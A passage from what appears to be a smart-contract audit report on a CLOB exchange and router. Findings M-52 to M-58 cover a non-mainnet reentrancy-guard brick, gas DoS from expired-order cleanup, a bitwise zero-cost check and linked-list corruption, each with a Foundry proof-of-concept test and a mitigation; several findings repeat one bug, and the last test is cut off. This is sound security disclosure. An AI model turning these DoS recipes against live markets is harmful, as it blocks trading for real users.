            fillOrderType: ICLOB.FillOrderType.IMMEDIATE_OR_CANCEL
        });

        vm.expectRevert(CLOB.ZeroCostTrade.selector);
        vm.prank(taker);
        clob.postFillOrder(taker, buy);

        assertEq(clob.getOrder(firstId).owner, maker, "live liquidity is still stranded");
    }
}

## Suggested Mitigation
Store the appended order's prevOrderId before writing it to self.orders, or explicitly update self.orders[order.id].prevOrderId after setting tailOrder.nextOrderId. Add invariant tests that every populated limit has nonzero head/tail and consistent forward/backward links after post, cancel, amend, expiry removal, and non-competitive removal.
```

### M-52 / `S7in-uafMZq650UhBgUK0`
- Finding title: GTERouter nonReentrant entrypoints are permanently bricked on non-mainnet chains
- Report lines: 5018-5091
```md
## [M-52]. GTERouter nonReentrant entrypoints are permanently bricked on non-mainnet chains

## id: S7in-uafMZq650UhBgUK0

## Derived From Pattern/Invariant
ChainIdorDomainDrift

## Exploit Type
Dos

## Location
GTERouter.executeRoute

## Finding Status: Valid
### Finding Status Justification:
### Finding Complexity: 2
## Minimim Privilege Required:Permissionless


## Description
GTERouter inherits Solady ReentrancyGuardTransient but does not override _useTransientReentrancyGuardOnlyOnMainnet(). On chainid != 1, Solady's fallback storage branch reverts when the guard slot is zero, which is the default for this contract. As a result every nonReentrant router entrypoint reverts before executing on any non-mainnet/L2 deployment.

Vulnerable path:
function executeRoute(...) external nonReentrant inTime(deadline) returns (...) { ... }

Solady branch:
if (block.chainid == 1) { tload/tstore } else { if eq(sload(s), address()) revert Reentrancy(); sstore(s, address()) }

Because GTERouter never initializes the storage guard slot and never overrides the hook to always use transient storage on Cancun chains, the first and all subsequent calls to executeRoute, launchpadBuy, and launchpadSell revert on chainid != 1.

## Impact
All guarded router trading paths are unavailable on non-mainnet deployments, blocking route execution and launchpad buy/sell wrappers for every user.

## Proof of Concept
1. Deploy GTERouter on a chain or fork with chainid != 1.
2. Call executeRoute with any arguments.
3. The nonReentrant modifier executes before the function body.
4. The guard reads the uninitialized storage slot as zero and reverts with Reentrancy.
5. Since no successful call can initialize the slot, the function remains permanently unusable.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {GTERouter} from "contracts/router/GTERouter.sol";

contract GTERouterTransientGuardPoC is Test {
    function test_executeRouteRevertsForeverOnNonMainnet() external {
        vm.chainId(31337);
        GTERouter router = new GTERouter(
            payable(address(0x1001)),
            address(0x1002),
            address(0x1003),
            address(0x1004),
            address(0x1005),
            address(0x1006)
        );

        bytes[] memory hops = new bytes[](1);
        hops[0] = abi.encodePacked(bytes1(uint8(1)), abi.encode(address(0xBEEF)));

        vm.expectRevert();
        router.executeRoute(address(0xCAFE), 1 ether, 1, block.timestamp + 1, hops);

        vm.expectRevert();
        router.executeRoute(address(0xCAFE), 1 ether, 1, block.timestamp + 1, hops);
    }
}

## Suggested Mitigation
Override _useTransientReentrancyGuardOnlyOnMainnet() in GTERouter to return false on chains where Cancun transient storage is supported, or use a standard storage ReentrancyGuard initialized to a nonzero not-entered value.
```

### M-53 / `jiTlrD6mS8stMUieQXaAV`
- Finding title: Expired order cleanup can make GTERouter.executeRoute CLOB fills exceed block gas and brick a market side
- Report lines: 5092-5191
```md
## [M-53]. Expired order cleanup can make GTERouter.executeRoute CLOB fills exceed block gas and brick a market side

## id: jiTlrD6mS8stMUieQXaAV

## Derived From Pattern/Invariant
UnboundedLoops

## Exploit Type
GasGriefBlockLimit

## Location
GTERouter.executeRoute

## Finding Status: Valid
### Finding Status Justification: The described router-to-CLOB flow exists. executeRoute reaches _executeClobPostFillOrder, which creates an unrestricted FILL_OR_KILL CLOB fill. CLOB matching then clears expired top-of-book orders in an unbounded while loop before live matching. Because there is no global per-price order cap and no bounded cleanup function used by the router, expired orders placed over many transactions can make the route exceed gas and revert, rolling back cleanup. This is in-scope, currently reachable by permissionless makers and takers, and not documented as an accepted design risk.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
GTERouter routes CLOB fill hops directly into the market with no bound on how much expired-order cleanup may be performed before the actual fill. In _executeClobPostFillOrder the router builds an unrestricted FOK taker order and calls ICLOB(market).postFillOrder(msg.sender, fillArgs). The CLOB matching path then repeatedly removes expired top-of-book orders in an unbounded while loop before it can reach live liquidity: while (bestAskPrice <= incomingOrder.price && incomingOrder.amount > 0) { ... if (bestAskOrder.isExpired()) { _removeExpiredAsk(ds, bestAskOrder); bestAskPrice = ds.getBestAskPrice(); continue; } ... }. Because there is no global cap on orders at a price level and expired orders are only cleared inside the taker fill path, an attacker can post many minimum-size orders over many transactions, let them expire, and leave them at the best price. Any later router CLOB_FILL crossing that side must clear all of them in one transaction. Once the expired queue is large enough, the required cleanup and maker-credit settlement exceeds the block gas limit, so user routes revert and the stale top-of-book remains in place.

## Impact
A permissionless attacker can functionally DoS buys or sells on an affected CLOB market through the router. User routes that should consume valid live liquidity revert before reaching it, leaving market functionality unavailable until enough expired orders are cleared through some bounded external process that does not currently exist.

## Proof of Concept
1. Attacker deposits the minimum base amount and posts many sell limit orders at the best ask with near-term cancelTimestamp values over multiple transactions. 2. The orders expire but remain in the book. 3. Attacker or an honest maker places one live ask behind the expired queue. 4. Victim calls GTERouter.executeRoute with a CLOB_FILL hop from quote token to base token. 5. The router calls CLOB.postFillOrder, which must iterate over every expired ask and build maker refunds before matching the live ask. 6. With enough expired orders, the fill exceeds block gas and reverts; because the cleanup reverts too, subsequent router fills hit the same expired queue again.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import {Test} from "forge-std/Test.sol";
import {GTERouter} from "contracts/router/GTERouter.sol";
import {ICLOB, Side} from "contracts/clob/ICLOB.sol";

// Intended to be dropped into the repo's router/CLOB test harness where router,
// clob, baseToken, quoteToken, acctManager, maker, and taker are initialized.
contract ExpiredOrderRouterGasDoSTest is Test {
    GTERouter router;
    ICLOB clob;
    address baseToken;
    address quoteToken;
    address maker;
    address taker;
    uint256 constant LOT = 1e18;

    function testExpiredOrdersMakeRouterClobFillGasExplode() external {
        // Harness setup should create a market with maxLimitsPerTx = 255 and fund maker/taker spot balances.
        uint256 expiredOrders = 200;

        for (uint256 i; i < expiredOrders; ++i) {
            vm.prank(maker);
            router.clobPostLimitOrder(
                clob,
                ICLOB.PostLimitOrderArgs({
                    amountInBase: LOT,
                    price: 1e18,
                    cancelTimestamp: uint32(block.timestamp + 1),
                    side: Side.SELL,
                    clientOrderId: uint96(i + 1),
                    limitOrderType: ICLOB.LimitOrderType.POST_ONLY
                })
            );
        }

        vm.warp(block.timestamp + 2);

        vm.prank(maker);
        router.clobPostLimitOrder(
            clob,
            ICLOB.PostLimitOrderArgs({
                amountInBase: LOT,
                price: 1e18,
                cancelTimestamp: 0,
                side: Side.SELL,
                clientOrderId: uint96(expiredOrders + 1),
                limitOrderType: ICLOB.LimitOrderType.POST_ONLY
            })
        );

        bytes[] memory hops = new bytes[](1);
        hops[0] = abi.encodePacked(
            bytes1(uint8(GTERouter.HopType.CLOB_FILL)),
            abi.encode(GTERouter.ClobHopArgs({hopType: GTERouter.HopType.CLOB_FILL, tokenOut: baseToken}))
        );

        uint256 gasBefore = gasleft();
        vm.prank(taker);
        router.executeRoute(quoteToken, LOT, 1, block.timestamp, hops);
        uint256 gasUsed = gasBefore - gasleft();

        assertGt(gasUsed, 10_000_000, "expired cleanup consumes unbounded gas before live fill");
    }
}

## Suggested Mitigation
Add bounded expired-order cleanup with pagination or a separate permissionless cleanup function that processes at most N orders per call. Do not require taker fills or router routes to clear an unbounded expired queue before matching live liquidity. Consider enforcing a per-price-level order cap or making expired orders non-blocking in matching by skipping with a bounded cursor.
```

### M-54 / `CI1pMro9PUu-pjukfJxxj`
- Finding title: Bitwise zero-cost check lets dust resting orders revert valid crossing limit orders
- Report lines: 5192-5226
```md
## [M-54]. Bitwise zero-cost check lets dust resting orders revert valid crossing limit orders

## id: CI1pMro9PUu-pjukfJxxj

## Derived From Pattern/Invariant
DivideByZeroOrOverFlowInCustomMath

## Exploit Type
Dos

## Location
CLOB.postLimitOrder

## Finding Status: Valid
### Finding Status Justification: The in-scope CLOB limit-order path uses baseTokenAmountReceived & quoteTokenAmountSent == 0 and the symmetric ask-side expression as a zero-cost predicate. That is a bitwise intersection test, not a check that either amount is zero. Two positive trade amounts can have no shared set bits, causing a valid matched limit order to revert with ZeroCostTrade. Fill orders use separate aggregate zero checks, so this is specific to marketable limit processing. There is no complete safeguard, and a permissionless maker can choose resting liquidity parameters that trigger the predicate.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
CLOB uses a bitwise AND as a zero-cost-trade predicate after matching a crossing limit order: `if (baseTokenAmountReceived != quoteTokenAmountSent && baseTokenAmountReceived & quoteTokenAmountSent == 0) revert ZeroCostTrade();`. This is not a valid zero check. Two non-zero trade amounts can have no overlapping binary bits, for example 128 base and 256 quote. A maker can place a tiny top-of-book order with such values. Any crossing limit order that matches it reaches this predicate and reverts even though both legs are non-zero and the same liquidity can be filled through postFillOrder.

## Impact
Permissionless makers can cheaply block valid crossing limit orders at selected top-of-book prices. Router or direct users attempting limit-order execution revert until the crafted order is removed through a fill path.

## Proof of Concept
1. Attacker posts a 128-base ask at price 2e18, making the quote leg 256. 2. Victim posts a buy limit order crossing that ask. 3. Matching computes baseTokenAmountReceived = 128 and quoteTokenAmountSent = 256. 4. Both amounts are non-zero, but `128 & 256 == 0`, so CLOB reverts ZeroCostTrade. 5. A normal fill order against the same ask succeeds, proving the revert is caused by the predicate rather than invalid liquidity.

## Proof of Code
pragma solidity 0.8.27; import {Test} from "forge-std/Test.sol"; import {UpgradeableBeacon} from "@openzeppelin/proxy/beacon/UpgradeableBeacon.sol"; import {BeaconProxy} from "@openzeppelin/proxy/beacon/BeaconProxy.sol"; import {CLOB, MarketConfig, MarketSettings} from "contracts/clob/CLOB.sol"; import {ICLOB, Side} from "contracts/clob/ICLOB.sol"; contract FakeAM { function getOperatorRoleApprovals(address,address) external pure returns(uint256){return 0;} function settleIncomingOrder(ICLOB.SettleParams calldata) external pure returns(uint256){return 0;} function creditAccount(address,address,uint256) external {} function creditAccountNoEvent(address,address,uint256) external {} function debitAccount(address,address,uint256) external {} } contract FakeFactory { function getMaxLimitExempt(address) external pure returns(bool){return false;} } contract BitwiseZeroCostDoSTest is Test { CLOB clob; function setUp() public { FakeAM am = new FakeAM(); FakeFactory f = new FakeFactory(); CLOB impl = new CLOB(address(f), address(0xBEEF), address(am), 100); UpgradeableBeacon beacon = new UpgradeableBeacon(address(impl), address(this)); MarketConfig memory cfg = MarketConfig({quoteToken: address(0x1001), baseToken: address(0x1002), quoteSize: 1e18, baseSize: 1e18}); MarketSettings memory st = MarketSettings({status: true, maxLimitsPerTx: 10, minLimitOrderAmountInBase: 100, tickSize: 1, lotSizeInBase: 1}); clob = CLOB(address(new BeaconProxy(address(beacon), abi.encodeWithSelector(CLOB.initialize.selector, cfg, st, address(this))))); } function testBitwiseZeroCostPredicateRevertsValidCrossingLimitOrder() public { address attacker = address(0xA11CE); address victim = address(0xB0B); vm.prank(attacker); clob.postLimitOrder(attacker, ICLOB.PostLimitOrderArgs({amountInBase: 128, price: 2e18, cancelTimestamp: 0, side: Side.SELL, clientOrderId: 0, limitOrderType: ICLOB.LimitOrderType.POST_ONLY})); vm.prank(victim); vm.expectRevert(CLOB.ZeroCostTrade.selector); clob.postLimitOrder(victim, ICLOB.PostLimitOrderArgs({amountInBase: 1000, price: 2e18, cancelTimestamp: 0, side: Side.BUY, clientOrderId: 0, limitOrderType: ICLOB.LimitOrderType.GOOD_TILL_CANCELLED})); assertEq(clob.getNumAsks(), 1); vm.prank(victim); ICLOB.PostFillOrderResult memory r = clob.postFillOrder(victim, ICLOB.PostFillOrderArgs({amount: 128, priceLimit: 2e18, side: Side.BUY, amountIsBase: true, fillOrderType: ICLOB.FillOrderType.FILL_OR_KILL})); assertEq(r.baseTokenAmountTraded, int256(128)); assertEq(clob.getNumAsks(), 0); } }

## Suggested Mitigation
Replace the bitwise predicate with an explicit logical zero check, for example `if ((baseTokenAmountReceived == 0) != (quoteTokenAmountSent == 0)) revert ZeroCostTrade();`, or remove it if the preceding aggregate zero check is sufficient. Apply the same fix to both bid and ask limit processing.
```

### M-55 / `jUMknNEuqkC60UN4wp2td`
- Finding title: BookLib stores appended orders without prevOrderId, corrupting same-price queues and blocking matching
- Report lines: 5227-5338
```md
## [M-55]. BookLib stores appended orders without prevOrderId, corrupting same-price queues and blocking matching

## id: jUMknNEuqkC60UN4wp2td

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
BookLib.addOrderToBook

## Finding Status: Valid
### Finding Status Justification:
### Finding Complexity: 4
## Minimim Privilege Required:Permissionless


## Description
When appending an order to a non-empty price limit, BookLib stores the order before setting its prevOrderId. _updateBookPostOrder writes self.orders[order.id] = order, then _updateLimitPostOrder mutates only the memory copy order.prevOrderId. The stored appended order therefore keeps prevOrderId == 0.

Vulnerable snippets:
function _updateBookPostOrder(Book storage self, Order memory order) private returns (Limit storage limit) { ... self.orders[order.id] = order; }

function _updateLimitPostOrder(Book storage self, Limit storage limit, Order memory order) private {
    limit.numOrders++;
    if (limit.headOrder.isNull()) { ... } else {
        Order storage tailOrder = self.orders[limit.tailOrder];
        tailOrder.nextOrderId = order.id;
        order.prevOrderId = tailOrder.id;
        limit.tailOrder = order.id;
    }
}

If the appended tail is canceled or removed, _updateLimitRemoveOrder sees prevOrderId == 0 and treats it as the head. For a two-order queue this sets headOrder to 0 and tailOrder to 0 while numOrders remains nonzero and the price stays in the tree. Future matching loads order 0 at the best price, produces zero deltas, and breaks/reverts even though real liquidity remains stored behind the corrupted limit.

## Impact
A permissionless maker can corrupt a best-price queue by placing and canceling a second order at the same price. This can block fills against that price level, break price-time priority, and make valid liquidity unusable until the market is migrated or manually repaired.

## Proof of Concept
1. Maker A posts a sell limit order at price P.
2. Maker B posts another sell limit order at the same price P. The stored second order has prevOrderId == 0.
3. Maker B cancels the second order.
4. BookLib treats the second order as the head and clears the limit head/tail while numOrders remains positive and the ask tree still contains P.
5. A taker submits a crossing bid; matching reads order 0 at the best ask and reverts/breaks instead of filling Maker A's valid order.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {CLOB, ICLOB} from "contracts/clob/CLOB.sol";
import {AccountManager} from "contracts/account-manager/AccountManager.sol";
import {Side} from "contracts/clob/types/Order.sol";
import {Limit, MarketConfig, MarketSettings} from "contracts/clob/types/Book.sol";

contract MockToken {
    string public name; string public symbol; uint8 public immutable decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    constructor(string memory n) { name = n; symbol = n; }
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transfer(address to, uint256 amount) external returns (bool) { return transferFrom(msg.sender, to, amount); }
    function transferFrom(address from, address to, uint256 amount) public returns (bool) { require(balanceOf[from] >= amount, "bal"); if (from != msg.sender && allowance[from][msg.sender] != type(uint256).max) allowance[from][msg.sender] -= amount; balanceOf[from] -= amount; balanceOf[to] += amount; return true; }
}

contract BookPrevPointerPoC is Test {
    function test_cancelTailCorruptsLimitAndBlocksBestAsk() external {
        address router = address(0x9999);
        address factory = address(this);
        MockToken base = new MockToken("BASE");
        MockToken quote = new MockToken("QUOTE");
        AccountManager am = new AccountManager(router, factory, new uint16[](1), new uint16[](1));
        CLOB clob = new CLOB(factory, router, address(am), 100);
        clob.initialize(
            MarketConfig(address(quote), address(base), 1 ether, 1 ether),
            MarketSettings(true, 10, 100, 1 ether, 100),
            address(this)
        );
        am.registerMarket(address(clob));

        address maker1 = address(0xA1); address maker2 = address(0xA2); address taker = address(0xB0);
        base.mint(maker1, 1_000 ether); base.mint(maker2, 1_000 ether); quote.mint(taker, 1_000 ether);
        vm.startPrank(maker1); base.approve(address(am), type(uint256).max); am.deposit(maker1, address(base), 1_000 ether); vm.stopPrank();
        vm.startPrank(maker2); base.approve(address(am), type(uint256).max); am.deposit(maker2, address(base), 1_000 ether); vm.stopPrank();
        vm.startPrank(taker); quote.approve(address(am), type(uint256).max); am.deposit(taker, address(quote), 1_000 ether); vm.stopPrank();

        ICLOB.PostLimitOrderArgs memory ask = ICLOB.PostLimitOrderArgs(100, 1 ether, 0, Side.SELL, 0, ICLOB.LimitOrderType.POST_ONLY);
        vm.prank(maker1); clob.postLimitOrder(maker1, ask);
        uint256 secondId = clob.getNextOrderId();
        vm.prank(maker2); clob.postLimitOrder(maker2, ask);

        uint256[] memory ids = new uint256[](1); ids[0] = secondId;
        vm.prank(maker2); clob.cancel(maker2, ICLOB.CancelArgs(ids));

        Limit memory limit = clob.getLimit(1 ether, Side.SELL);
        assertGt(limit.numOrders, 0);
        assertEq(uint256(limit.headOrder), 0);
        assertEq(uint256(limit.tailOrder), 0);

        vm.prank(taker);
        vm.expectRevert(CLOB.ZeroCostTrade.selector);
        clob.postFillOrder(taker, ICLOB.PostFillOrderArgs(100, 1 ether, Side.BUY, true, ICLOB.FillOrderType.FILL_OR_KILL));
    }
}

## Suggested Mitigation
Set order.prevOrderId before storing the appended order, or update the stored order after assigning the previous pointer. For example, in the non-empty branch set self.orders[order.id].prevOrderId = tailOrder.id after tailOrder.nextOrderId = order.id, and add invariant tests for head/tail/prev/next consistency after append, cancel, amend, and match.
```

### M-56 / `862phQLIcBWjMjtUglV8a`
- Finding title: Bitwise zero-cost guard reverts valid nonzero limit matches with disjoint binary amounts
- Report lines: 5339-5405
```md
## [M-56]. Bitwise zero-cost guard reverts valid nonzero limit matches with disjoint binary amounts

## id: 862phQLIcBWjMjtUglV8a

## Derived From Pattern/Invariant
DivideByZeroOrOverFlowInCustomMath

## Exploit Type
IntegerMath

## Location
CLOB._processLimitBidOrder/_processLimitAskOrder

## Finding Status: Valid
### Finding Status Justification: The limit-order zero-cost guard currently evaluates whether base and quote amounts have overlapping bits. Both legs can be positive while their bitwise AND is zero, so the code can revert valid crossing limit matches. The equivalent fill-order path's explicit zero checks do not protect postLimitOrder. The issue exists in CLOB._processLimitBidOrder and _processLimitAskOrder, both in scope, and can be reached through normal maker/taker order flow without privileged action.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
The limit-order zero-cost check intends to revert only when one matched leg is zero, but it uses bitwise `&` between the nonzero trade amounts:

`if (baseTokenAmountReceived != quoteTokenAmountSent && baseTokenAmountReceived & quoteTokenAmountSent == 0) revert ZeroCostTrade();`

and similarly for asks. This condition reverts whenever both legs are nonzero but their binary representations have no common set bit, for example `baseDelta = 128` and `quoteDelta = 256`. Fill orders do not apply this bitwise guard, so the same economic match can succeed through `postFillOrder` but revert through a crossing `postLimitOrder`.

## Impact
Valid crossing limit orders can be made to revert despite transferring positive value on both legs. A maker can choose price/size combinations that poison crossing limit-order flow at the top of book, reducing market availability and causing failed trades for users and routers that submit marketable limit orders.

## Proof of Concept
1. Deploy or create a market with 0-decimal test tokens, `baseSize = 1`, `lotSizeInBase = 1`, and `minLimitOrderAmountInBase = 100`.
2. Maker posts a sell limit order for `128` base at price `2`.
3. Taker submits a crossing buy limit for `128` base at price `2`.
4. Matching computes positive amounts: `baseTokenAmountReceived = 128`, `quoteTokenAmountSent = 256`.
5. Because `128 & 256 == 0`, `_processLimitBidOrder` reverts `ZeroCostTrade` even though neither side is zero.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import {CLOBTestBase} from "test/clob/utils/CLOBTestBase.sol";
import {ICLOB, Side} from "contracts/clob/ICLOB.sol";

contract BitwiseZeroCostPOC is CLOBTestBase {
    function test_crossingLimitRevertsWhenBothMatchedLegsAreNonZero() public {
        _deployZeroDecimalMarket({minAmount: 100, tickSize: 1, lotSize: 1});
        address maker = makeAddr("maker");
        address taker = makeAddr("taker");
        _mintAndDepositBase(maker, 128);
        _mintAndDepositQuote(taker, 256);

        vm.prank(maker);
        clob.postLimitOrder(maker, ICLOB.PostLimitOrderArgs({amountInBase: 128, price: 2, cancelTimestamp: 0, side: Side.SELL, clientOrderId: 0, limitOrderType: ICLOB.LimitOrderType.POST_ONLY}));

        vm.prank(taker);
        vm.expectRevert(CLOB.ZeroCostTrade.selector);
        clob.postLimitOrder(taker, ICLOB.PostLimitOrderArgs({amountInBase: 128, price: 2, cancelTimestamp: 0, side: Side.BUY, clientOrderId: 0, limitOrderType: ICLOB.LimitOrderType.GOOD_TILL_CANCELLED}));

        assertEq(accountManager.getAccountBalance(taker, baseToken), 0, "valid nonzero match was blocked");
        assertEq(clob.getOrder(1).amount, 128, "maker order remains unfilled");
    }
}

## Suggested Mitigation
Replace the bitwise condition with an explicit logical zero-leg check: `if ((baseTokenAmountReceived == 0) != (quoteTokenAmountSent == 0)) revert ZeroCostTrade();` or simply rely on the existing zero-order/zero-fill checks. Add tests where both matched legs are nonzero but `baseDelta & quoteDelta == 0`.
```

### L-57 / `2hWPwrRLWp-9Cy5L-441x`
- Finding title: Valid marketable limit orders can revert because ZeroCostTrade uses bitwise AND instead of zero checks
- Report lines: 5406-5451
```md
## [L-57]. Valid marketable limit orders can revert because ZeroCostTrade uses bitwise AND instead of zero checks

## id: 2hWPwrRLWp-9Cy5L-441x

## Derived From Pattern/Invariant
PricePrecisionOrRoundingError

## Exploit Type
RoundingError

## Location
CLOB._processLimitBidOrder

## Finding Status: Valid
### Finding Status Justification: The CLOB limit-order handlers contain the exact flawed predicate on both bid and ask flows. After matching, they compare the traded base and quote amounts and revert if their bitwise AND is zero. That condition can be true for positive nonzero amounts, so it is not a valid ZeroCostTrade check. The path is in analyzed production source, and normal users can reach it by posting marketable limit orders against crafted or naturally occurring resting liquidity. There is no complete fallback guard that prevents the erroneous revert for limit orders.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
After matching a marketable limit order, CLOB attempts to reject zero-cost trades with a bitwise test rather than checking whether one side is zero. Vulnerable snippets: `if (baseTokenAmountReceived != quoteTokenAmountSent && baseTokenAmountReceived & quoteTokenAmountSent == 0) revert ZeroCostTrade();` and the same pattern for asks. Positive amounts can have no common set bits, e.g. 128 base and 256 quote, so a real non-zero trade reverts after matching logic computes valid positive deltas. The transaction rolls back, leaving the maker order on the book and preventing that class of marketable limit order from executing.

## Impact
Users can be denied valid marketable limit-order execution against available liquidity. A maker can place liquidity at amounts/prices that cause common crossed limit-order sizes to revert, degrading orderbook liveness and forcing users to switch order types or amounts.

## Proof of Concept
1. Configure a market with baseSize 1 and lotSize 1. 2. A maker posts an ask for 128 base at price 2, so the matched quote amount is 256. 3. A taker submits a marketable bid limit order for 128 base at price 2. 4. Matching computes baseTokenAmountReceived = 128 and quoteTokenAmountSent = 256, both positive, but `128 & 256 == 0`, so the order reverts with `ZeroCostTrade`.

## Proof of Code
pragma solidity 0.8.27;
import "forge-std/Test.sol";
import {BeaconProxy, IBeacon} from "@openzeppelin/proxy/beacon/BeaconProxy.sol";
import {CLOB, ICLOB, MarketConfig, MarketSettings} from "contracts/clob/CLOB.sol";
import {Side} from "contracts/clob/types/Order.sol";
import {IAccountManager} from "contracts/account-manager/IAccountManager.sol";
import {ICLOBManager, SettingsParams} from "contracts/clob/ICLOBManager.sol";
import {FeeTiers} from "contracts/clob/types/FeeData.sol";
contract B is IBeacon { address public implementation; constructor(address impl){implementation=impl;} }
contract A is IAccountManager { function getOperatorRoleApprovals(address,address) external pure returns(uint256){return type(uint256).max;} function getAccountBalance(address,address) external pure returns(uint256){return 0;} function getEventNonce() external pure returns(uint256){return 0;} function getTotalFees(address) external pure returns(uint256){return 0;} function getUnclaimedFees(address) external pure returns(uint256){return 0;} function getFeeTier(address) external pure returns(FeeTiers){return FeeTiers.ZERO;} function getSpotTakerFeeRateForTier(FeeTiers) external pure returns(uint256){return 0;} function getSpotMakerFeeRateForTier(FeeTiers) external pure returns(uint256){return 0;} function deposit(address,address,uint256) external {} function withdraw(address,address,uint256) external {} function depositFromRouter(address,address,uint256) external {} function withdrawToRouter(address,address,uint256) external {} function registerMarket(address) external {} function settleIncomingOrder(ICLOB.SettleParams calldata) external pure returns(uint256){return 0;} function collectFees(address,address) external pure returns(uint256){return 0;} function setSpotAccountFeeTier(address,FeeTiers) external {} function setSpotAccountFeeTiers(address[] calldata,FeeTiers[] calldata) external {} function creditAccount(address,address,uint256) external {} function creditAccountNoEvent(address,address,uint256) external {} function debitAccount(address,address,uint256) external {} }
contract F is ICLOBManager { function beacon() external pure returns(address){return address(0);} function getMarketAddress(address,address) external pure returns(address){return address(0);} function isMarket(address) external pure returns(bool){return true;} function createMarket(address,address,SettingsParams calldata) external pure returns(address){return address(0);} function setMaxLimitsPerTx(ICLOB[] calldata,uint8[] calldata) external {} function setTickSizes(ICLOB[] calldata,uint256[] calldata) external {} function setMinLimitOrderAmounts(ICLOB[] calldata,uint256[] calldata) external {} function getMaxLimitExempt(address) external pure returns(bool){return false;} function setAccountFeeTiers(address[] calldata,FeeTiers[] calldata) external {} function setMaxLimitsExempt(address[] calldata,bool[] calldata) external {} }
contract ZeroCostBitwiseTest is Test { function testPositiveAmountsWithNoCommonBitsRevert() external { A am = new A(); F fm = new F(); CLOB logic = new CLOB(address(fm), address(0xbeef), address(am), 100); bytes memory init = abi.encodeWithSelector(CLOB.initialize.selector, MarketConfig({quoteToken: address(0x1), baseToken: address(0x2), quoteSize: 1, baseSize: 1}), MarketSettings({status: true, maxLimitsPerTx: 10, minLimitOrderAmountInBase: 100, tickSize: 1, lotSizeInBase: 1}), address(this)); CLOB clob = CLOB(address(new BeaconProxy(address(new B(address(logic))), init))); clob.postLimitOrder(address(0xA11CE), ICLOB.PostLimitOrderArgs({amountInBase: 128, price: 2, cancelTimestamp: 0, side: Side.SELL, clientOrderId: 0, limitOrderType: ICLOB.LimitOrderType.POST_ONLY})); vm.expectRevert(CLOB.ZeroCostTrade.selector); clob.postLimitOrder(address(0xB0B), ICLOB.PostLimitOrderArgs({amountInBase: 128, price: 2, cancelTimestamp: 0, side: Side.BUY, clientOrderId: 0, limitOrderType: ICLOB.LimitOrderType.GOOD_TILL_CANCELLED})); } }

## Suggested Mitigation
Replace the bitwise expression with direct zero checks: `if (baseTokenAmountReceived == 0 || quoteTokenAmountSent == 0) revert ZeroCostTrade();` for matched flow, and account for pure post-only/resting cases separately so non-crossing limit orders are not rejected.
```

### M-58 / `3r67ZUXco89RLvFbEmeiB`
- Finding title: Canceling the tail order at a shared price level corrupts the CLOB linked list and blocks matching
- Report lines: 5452-5553
```md
## [M-58]. Canceling the tail order at a shared price level corrupts the CLOB linked list and blocks matching

## id: 3r67ZUXco89RLvFbEmeiB

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
Dos

## Location
CLOB.postLimitOrder/cancel

## Finding Status: Valid
### Finding Status Justification: BookLib's append path stores the new order before assigning prevOrderId, so a second order at the same price is stored as if it were the head. When that tail is cancelled, _updateLimitRemoveOrder sets the limit head and tail to zero while numOrders remains one and the price stays in the tree. Incoming matching sees the corrupted best price, reads order id zero, and breaks with no fill. The issue is in production scope and can be executed by any account able to post and cancel its own orders.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
BookLib stores the new order before assigning its prevOrderId. In _updateBookPostOrder the order is written with prevOrderId == 0 via self.orders[order.id] = order, then _updateLimitPostOrder only mutates the memory copy with order.prevOrderId = tailOrder.id. A second order appended at the same price is therefore stored as if it had no predecessor. When that tail order is canceled, _updateLimitRemoveOrder treats it as the head and sets limit.headOrder and limit.tailOrder to zero while limit.numOrders remains 1 and the price remains in the tree. CLOB matching then repeatedly sees this corrupted best price, loads order id 0, gets baseDelta == 0, and breaks without reaching valid worse-priced orders. An attacker can lock a minimum-size head order, append a second order at the same price, cancel the tail, and leave the side of the book unmatchable until they voluntarily cancel the stranded head order. Vulnerable snippet: self.orders[order.id] = order executes before order.prevOrderId = tailOrder.id, so the stored tail prevOrderId is never updated.

## Impact
A permissionless maker can cheaply cause a persistent market-level matching DoS for one side of the book. Buy orders cannot consume asks behind the corrupted best ask, and book/open-interest state diverges from traversable live orders.

## Proof of Concept
1. Attacker posts an ask at the lowest valid price with the minimum valid size.
2. Attacker posts a second ask at the same price, becoming the tail.
3. Because the stored second order has prevOrderId == 0, attacker cancels the second order.
4. The limit still reports numOrders == 1 and the price remains in the ask tree, but headOrder and tailOrder are zero.
5. Any incoming bid sees that price as best ask, loads the null order, receives baseDelta == 0, and breaks before matching valid liquidity at higher ask prices.

## Proof of Code
pragma solidity 0.8.27;

import 'forge-std/Test.sol';
import {Book, BookLib, Limit} from 'contracts/clob/types/Book.sol';
import {Order, Side, OrderIdLib} from 'contracts/clob/types/Order.sol';

contract BookHarness {
    using BookLib for Book;
    using OrderIdLib for uint256;

    Book internal book;

    function addAsk(uint256 id, uint256 price, uint256 amount, address owner) external {
        Order memory o;
        o.side = Side.SELL;
        o.id = id.toOrderId();
        o.owner = owner;
        o.price = price;
        o.amount = amount;
        book.addOrderToBook(o);
    }

    function remove(uint256 id) external {
        book.removeOrderFromBook(book.orders[id.toOrderId()]);
    }

    function limit(uint256 price) external view returns (uint64 numOrders, uint256 head, uint256 tail) {
        Limit storage l = book.askLimits[price];
        return (l.numOrders, l.headOrder.unwrap(), l.tailOrder.unwrap());
    }

    function order(uint256 id) external view returns (Order memory) {
        return book.orders[id.toOrderId()];
    }

    function bestAsk() external view returns (uint256) {
        return book.getBestAskPrice();
    }
}

contract CLOBLinkedListBugTest is Test {
    function testCancelTailLeavesBestAskWithZeroHead() external {
        BookHarness h = new BookHarness();
        address maker = address(0xA11CE);

        h.addAsk(1, 1, 100, maker);
        h.addAsk(2, 1, 100, maker);
